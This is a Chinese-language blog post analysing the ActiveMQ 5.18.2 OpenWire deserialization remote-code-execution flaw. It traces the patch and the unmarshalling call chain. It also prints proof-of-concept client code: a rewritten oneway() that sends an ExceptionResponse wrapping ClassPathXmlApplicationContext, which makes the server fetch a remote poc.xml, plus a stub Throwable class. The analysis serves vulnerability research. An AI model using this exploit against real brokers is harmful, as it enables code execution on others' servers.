@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="activemq-5.18.2漏洞环境查看windows搭建windows环境搭建在目录下使用mvn clean install -DskipTests将activemq-activemq-5.18.2&#x2F;assembly&#x2F;target的apache-activemq-5.18.2-bin.zip解压添加到库中这样没完全添加，将lib目录下文件全部添加然后把其中的 conf、we">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ActiveMQ RCE 分析">
+<meta property="og:url" content="http://example.com/2024/04/10/ActiveMQ%20RCE%20%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="n1ght的个人主页">
+<meta property="og:description" content="activemq-5.18.2漏洞环境查看windows搭建windows环境搭建在目录下使用mvn clean install -DskipTests将activemq-activemq-5.18.2&#x2F;assembly&#x2F;target的apache-activemq-5.18.2-bin.zip解压添加到库中这样没完全添加，将lib目录下文件全部添加然后把其中的 conf、we">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240405212733.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240405212940.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240405215559.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240405221500.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240405222650.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240405222336.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240405222506.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/Snipaste_2024-04-05_22-32-20.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240405230018.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240405230120.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240405230157.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240405230251.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/Snipaste_2024-04-05_23-04-41.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240405231033.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240405231730.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240405222336.png">
+<meta property="article:published_time" content="2024-04-10T10:26:32.000Z">
+<meta property="article:modified_time" content="2024-04-27T12:51:42.193Z">
+<meta property="article:author" content="N1ght">
+<meta property="article:tag" content="java">
+<meta property="article:tag" content="cve">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240405212733.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>ActiveMQ RCE 分析</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/yezere/yezere.github.io">项目</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2024/04/12/2024%E9%98%BF%E9%87%8C%E4%BA%91ctf-web-chain17%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2024/04/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96UTF-8%20Overlong%20Encoding/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/04/10/ActiveMQ%20RCE%20%E5%88%86%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/04/10/ActiveMQ%20RCE%20%E5%88%86%E6%9E%90/&text=ActiveMQ RCE 分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/04/10/ActiveMQ%20RCE%20%E5%88%86%E6%9E%90/&title=ActiveMQ RCE 分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/04/10/ActiveMQ%20RCE%20%E5%88%86%E6%9E%90/&is_video=false&description=ActiveMQ RCE 分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ActiveMQ RCE 分析&body=Check out this article: http://example.com/2024/04/10/ActiveMQ%20RCE%20%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/04/10/ActiveMQ%20RCE%20%E5%88%86%E6%9E%90/&title=ActiveMQ RCE 分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/04/10/ActiveMQ%20RCE%20%E5%88%86%E6%9E%90/&title=ActiveMQ RCE 分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/04/10/ActiveMQ%20RCE%20%E5%88%86%E6%9E%90/&title=ActiveMQ RCE 分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/04/10/ActiveMQ%20RCE%20%E5%88%86%E6%9E%90/&title=ActiveMQ RCE 分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/04/10/ActiveMQ%20RCE%20%E5%88%86%E6%9E%90/&name=ActiveMQ RCE 分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/04/10/ActiveMQ%20RCE%20%E5%88%86%E6%9E%90/&t=ActiveMQ RCE 分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E5%86%99activeMQ%E9%80%9A%E4%BF%A1demo"><span class="toc-number">1.</span> <span class="toc-text">编写activeMQ通信demo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.</span> <span class="toc-text">总结</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        ActiveMQ RCE 分析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">N1ght</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-04-10T10:26:32.000Z" class="dt-published" itemprop="datePublished">2024-04-10</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/cve/" rel="tag">cve</a>, <a class="p-category" href="/tags/java/" rel="tag">java</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><a target="_blank" rel="noopener" href="https://github.com/apache/activemq/releases/tag/activemq-5.18.2">activemq-5.18.2</a><br>漏洞环境<br>查看windows搭建<br><a target="_blank" rel="noopener" href="https://activemq.apache.org/components/classic/documentation/version-5-getting-started#installation-procedure-for-windows">windows环境搭建</a><br>在目录下使用<br>mvn clean install -DskipTests<br>将activemq-activemq-5.18.2&#x2F;assembly&#x2F;target的apache-activemq-5.18.2-bin.zip<br>解压<br><img src="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240405212733.png"><br>添加到库中<br>这样没完全添加，将lib目录下文件全部添加<br>然后把其中的 conf、webapps 和 lib 文件夹，拷贝到 activemq-parent-5.15.12 项目的同级目录下<br>运行<br><img src="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240405212940.png"><br>$ cat log.txt |grep marshaller<br>    This fixes the OpenWire v12 marshaller so that if an exception is<br>    AMQ-9370 - Improve Openwire marshaller validation test<br>    AMQ-9370 - Openwire marshaller should validate Throwable class type<br>    AMQ-9370 - Openwire marshaller should validate Throwable class type<br>    Fixing KahaDB so that the correct marshaller is used for the message<br>    Use the latest openwire version marshallers in the KahaDB store when<br>    <a target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/AMQ-3236">https://issues.apache.org/jira/browse/AMQ-3236</a> - fix regression in MessageAckTest, ensure wireversion is used for marshaller test<br>    Reverting recent chagnes to openwire v3 marshallers that snuck in with my last commit<br>    Set the eol style on the generated marshallers<br>    Added openwire v2 marshallers<br>    Adding initial marshaller for v2<br>    Configure our use of the gram maven plugin so that it generates the openwire marshaller source code.<br>    with the m2 gram plugin to generate openwire marshallers under maven 2.<br>    latest generated OpenWire commands and marshallers - updated WireFormatInfo so that it has boolean flags for the various options like stack trace and the like (we should avoid int based bitflags going forwards now as they are harder to support in other languages and are more brittle)<br>    updated marshallers.<br>发现<br>commit 3eaf3107f4fb9a3ce7ab45c175bfaeac7e866d5b<br>记录下修改<br><img src="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240405215559.png"><br>增加了一行验证<br>查看createThrowable在哪里调用到他<br><img src="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240405221500.png"><br>BaseDataStreamMarshaller#tightUnmarsalThrowable<br>而且ExceptionResponseMarshaller的反序列化调用了他<br><img src="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240405222650.png"></p>
+<h2 id="编写activeMQ通信demo"><a href="#编写activeMQ通信demo" class="headerlink" title="编写activeMQ通信demo"></a>编写activeMQ通信demo</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.apache.activemq.ActiveMQConnection;  </span><br><span class="line"><span class="keyword">import</span> org.apache.activemq.ActiveMQConnectionFactory;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.jms.*;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">ActiveMQConnectionFactory</span> <span class="variable">connectionFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ActiveMQConnectionFactory</span>(<span class="string">&quot;tcp://localhost:61616&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">         <span class="comment">// 构造从工厂得到连接对象  </span></span><br><span class="line">            <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> connectionFactory.createConnection();  </span><br><span class="line">            <span class="comment">// 启动  </span></span><br><span class="line">            connection.start();  </span><br><span class="line">            <span class="comment">// 获取操作连接  </span></span><br><span class="line">            <span class="type">Session</span> <span class="variable">session</span> <span class="operator">=</span> connection.createSession(Boolean.TRUE,  </span><br><span class="line">                    Session.AUTO_ACKNOWLEDGE);  </span><br><span class="line">            <span class="comment">// 获取session注意参数值xingbo.xu-queue是一个服务器的queue，须在在ActiveMq的console配置  </span></span><br><span class="line">            <span class="type">Queue</span> <span class="variable">firstQueue</span> <span class="operator">=</span> session.createQueue(<span class="string">&quot;FirstQueue&quot;</span>);  </span><br><span class="line">            <span class="comment">// 得到消息生成者【发送者】  </span></span><br><span class="line">            <span class="type">MessageProducer</span> <span class="variable">producer</span> <span class="operator">=</span> session.createProducer(firstQueue);  </span><br><span class="line">            <span class="comment">// 设置不持久化，此处学习，实际根据项目决定  </span></span><br><span class="line">            <span class="type">ObjectMessage</span> <span class="variable">objectMessage</span> <span class="operator">=</span> session.createObjectMessage(<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 构造消息，此处写死，项目就是参数，或者方法获取  </span></span><br><span class="line">            producer.send(objectMessage);  </span><br><span class="line">            connection.close();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>发送信息后，activeMQ会调用<br>org.apache.activemq.openwire.OpenWireFormat#doUnmarshal()进行反序列化<br><img src="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240405222336.png"><br>观看源代码发现<br><img src="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240405222506.png"><br>是dataType的值决定了反序列化哪个</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">doUnmarshal</span><span class="params">(DataInput dis)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">    <span class="type">byte</span> <span class="variable">dataType</span> <span class="operator">=</span> dis.readByte();  </span><br><span class="line">    <span class="keyword">if</span> (dataType != <span class="number">0</span>) &#123;  </span><br><span class="line">        <span class="type">DataStreamMarshaller</span> <span class="variable">dsm</span> <span class="operator">=</span> <span class="built_in">this</span>.dataMarshallers[dataType &amp; <span class="number">255</span>];  </span><br><span class="line">        <span class="keyword">if</span> (dsm == <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Unknown data type: &quot;</span> + dataType);  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            <span class="type">Object</span> <span class="variable">data</span> <span class="operator">=</span> dsm.createObject();  </span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.tightEncodingEnabled) &#123;  </span><br><span class="line">                <span class="type">BooleanStream</span> <span class="variable">bs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BooleanStream</span>();  </span><br><span class="line">                bs.unmarshal(dis);  </span><br><span class="line">                dsm.tightUnmarshal(<span class="built_in">this</span>, data, dis, bs);  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                dsm.looseUnmarshal(<span class="built_in">this</span>, data, dis);  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">return</span> data;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>所以我们得想办法将dataType的值pattch成31<br>序列化的方法就是<br><img src="https://raw.githubusercontent.com/yezere/images/master/Snipaste_2024-04-05_22-32-20.png"><br>TcpTransport#oneway<br>调用的marshal方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">marshal</span><span class="params">(Object o, DataOutput dataOut)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.cacheEnabled) &#123;  </span><br><span class="line">        <span class="built_in">this</span>.runMarshallCacheEvictionSweep();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> <span class="number">1</span>;  </span><br><span class="line">    <span class="keyword">if</span> (o != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="type">DataStructure</span> <span class="variable">c</span> <span class="operator">=</span> (DataStructure)o;  </span><br><span class="line">        <span class="type">byte</span> <span class="variable">type</span> <span class="operator">=</span> c.getDataStructureType();  </span><br><span class="line">        <span class="type">DataStreamMarshaller</span> <span class="variable">dsm</span> <span class="operator">=</span> <span class="built_in">this</span>.dataMarshallers[type &amp; <span class="number">255</span>];  </span><br><span class="line">        <span class="keyword">if</span> (dsm == <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Unknown data type: &quot;</span> + type);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.tightEncodingEnabled) &#123;  </span><br><span class="line">            <span class="type">BooleanStream</span> <span class="variable">bs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BooleanStream</span>();  </span><br><span class="line">            size += dsm.tightMarshal1(<span class="built_in">this</span>, c, bs);  </span><br><span class="line">            size += bs.marshalledSize();  </span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.maxFrameSizeEnabled &amp;&amp; (<span class="type">long</span>)size &gt; <span class="built_in">this</span>.maxFrameSize) &#123;  </span><br><span class="line">                <span class="keyword">throw</span> IOExceptionSupport.createFrameSizeException(size, <span class="built_in">this</span>.maxFrameSize);  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">this</span>.sizePrefixDisabled) &#123;  </span><br><span class="line">                dataOut.writeInt(size);  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            dataOut.writeByte(type);  </span><br><span class="line">            bs.marshal(dataOut);  </span><br><span class="line">            dsm.tightMarshal2(<span class="built_in">this</span>, c, dataOut, bs);  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            <span class="type">DataOutput</span> <span class="variable">looseOut</span> <span class="operator">=</span> dataOut;  </span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">this</span>.sizePrefixDisabled) &#123;  </span><br><span class="line">                <span class="built_in">this</span>.bytesOut.restart();  </span><br><span class="line">                looseOut = <span class="built_in">this</span>.bytesOut;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            ((DataOutput)looseOut).writeByte(type);  </span><br><span class="line">            dsm.looseMarshal(<span class="built_in">this</span>, c, (DataOutput)looseOut);  </span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">this</span>.sizePrefixDisabled) &#123;  </span><br><span class="line">                <span class="type">ByteSequence</span> <span class="variable">sequence</span> <span class="operator">=</span> <span class="built_in">this</span>.bytesOut.toByteSequence();  </span><br><span class="line">                dataOut.writeInt(sequence.getLength());  </span><br><span class="line">                dataOut.write(sequence.getData(), sequence.getOffset(), sequence.getLength());  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.sizePrefixDisabled) &#123;  </span><br><span class="line">            dataOut.writeInt(size);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        dataOut.writeByte(<span class="number">0</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>获取类型，然后写入到序列化的类中<br>ExceptionResponseMarshaller是序列化的类，而ExceptionResponse就是传入的值<br>所以<br>command可以编写ExceptionResponse<br>dataOut即是ExceptionResponseMarshaller是序列化的类，<br>不用那么麻烦我们复制在当前文件中修改他的oneway即可</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">oneway</span><span class="params">(Object command)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">    <span class="built_in">this</span>.checkStarted();  </span><br><span class="line">    <span class="type">Throwable</span> <span class="variable">classPathXmlApplicationContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;http://127.0.0.1:9090/poc.xml&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    <span class="type">ExceptionResponse</span> <span class="variable">exceptionResponse</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExceptionResponse</span>(classPathXmlApplicationContext);  </span><br><span class="line">  </span><br><span class="line">    <span class="built_in">this</span>.wireFormat.marshal(exceptionResponse, <span class="built_in">this</span>.dataOut);  </span><br><span class="line">    <span class="built_in">this</span>.dataOut.flush();  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>由于ClassPathXmlApplicationContext要变成Throwable，我们重写一下他</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.springframework.context.support;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassPathXmlApplicationContext</span> <span class="keyword">extends</span> <span class="title class_">Throwable</span>&#123;  </span><br><span class="line">    <span class="keyword">private</span> String detailMessage;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ClassPathXmlApplicationContext</span><span class="params">()</span> &#123;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ClassPathXmlApplicationContext</span><span class="params">(String message)</span> &#123;  </span><br><span class="line">        detailMessage = message;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMessage</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> detailMessage;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>为什么能这样做了，我们详细看一下流程<br>因为我们发送的是ExceptionResponse，所以Type值为31<br><img src="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240405230018.png"><br>获取解析器，也就是ExceptionResponseMarshaller<br><img src="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240405230120.png"><br>进入looseUnmarsalThrowable<br><img src="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240405230157.png"><br>获取类名和参数<br><img src="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240405230251.png"><br>在server端的ClassPathXmlApplicationContext是正常的没有修改过的，调用createThrowable，<br>通过反射实例化，所以本地client端就可以任意修改，无所谓<br><img src="https://raw.githubusercontent.com/yezere/images/master/Snipaste_2024-04-05_23-04-41.png"><br>也就是实例化rce，FileSystemXmlApplicationContext也行<br><img src="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240405231033.png"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>入口类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">readCommand</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.wireFormat.unmarshal(<span class="built_in">this</span>.dataIn);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>通过代码交互，会自动调用到unmarshal中<br>OpenWireFormat#unmarshal-&gt;OpenWireFormat#doUnmarshal-&gt;ExceptionResponseMarshaller#looseUnmarshal-&gt;BaseDataStreamMarshaller#looseUnmarsalThrowable-&gt;BaseDataStreamMarshaller#createThrowable</p>
